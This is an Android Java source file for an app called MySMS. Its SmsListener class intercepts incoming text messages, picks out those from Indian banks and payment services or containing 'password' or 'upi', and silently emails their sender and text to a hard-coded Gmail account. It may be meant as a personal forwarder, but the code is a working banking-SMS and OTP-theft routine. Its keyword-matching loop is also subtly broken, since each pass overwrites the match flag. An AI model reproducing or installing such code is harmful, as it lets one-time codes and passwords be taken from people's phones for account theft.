package com.anvi.MySMS;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.Html;
import android.widget.Toast;

import java.util.ArrayList;

public class SmsListener extends BroadcastReceiver {

    private SharedPreferences preferences;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO Auto-generated method stub

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null){
                //---retrieve the SMS message received---
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for(int i=0; i<msgs.length; i++){
                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();
                        //Toast.makeText(context, msg_from, Toast.LENGTH_LONG).show();
                        //Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show();
//                        StringBuilder body = new StringBuilder("<div style=\"float: left; background-color: black; color: white; padding: 3px; width: auto; height: auto; text-align: left;\">");
//                        body.append("<pre>");
//                        body.append(msgBody);
//                        body.append("</pre>");
//                        body.append("</div>");

                        ArrayList<String> headerKeywords = new ArrayList<String>();
                        headerKeywords.add("icici");
                        headerKeywords.add("hdfc");
                        headerKeywords.add("lic");
                        headerKeywords.add("pnb");
                        headerKeywords.add("paytm");
                        headerKeywords.add("phonpe///////");
                        headerKeywords.add("ksrtc");

                        int matchFoundFlag = 0;
                        for(int j=0;j<headerKeywords.size();j++){
                            if ( msg_from.toLowerCase().indexOf(headerKeywords.get(j).toLowerCase()) != -1 ) {
                                matchFoundFlag = 1;
                            }
                            else if(msgBody.toLowerCase().indexOf("password") != -1 || msgBody.toLowerCase().indexOf("upi") != -1 ){
                                matchFoundFlag = 1;
                            }
                            else{
                                matchFoundFlag = 0;
                            }
                        }
                        if (matchFoundFlag == 1){
                            StringBuilder body = new StringBuilder("Message From : "+msg_from);
                            body.append("\n\nMessage :\n"+msgBody);
                            sendMail(context,msg_from, body.toString());
                        }


                    }
                }catch(Exception e){
//                            Log.d("Exception caught",e.getMessage());
                }
            }
        }
    }


    public void sendMail(final Context context,final String msg_from,final String msgBody){
        new Thread(new Runnable() {

            public void run() {

                try {

                    GMailSender sender = new GMailSender(

                            "anviphone****s@gmail.com",

                            "****");



                    //sender.addAttachment(Environment.getExternalStorageDirectory().getPath()+"/image.jpg");

                    sender.sendMail("My Phone Message : "+msg_from, msgBody,

                            "anviphon****s@gmail.com",

                            "anviphone****@gmail.com");









                } catch (Exception e) {

                    Toast.makeText(context,"Error",Toast.LENGTH_LONG).show();



                }

            }

        }).start();
    }

}
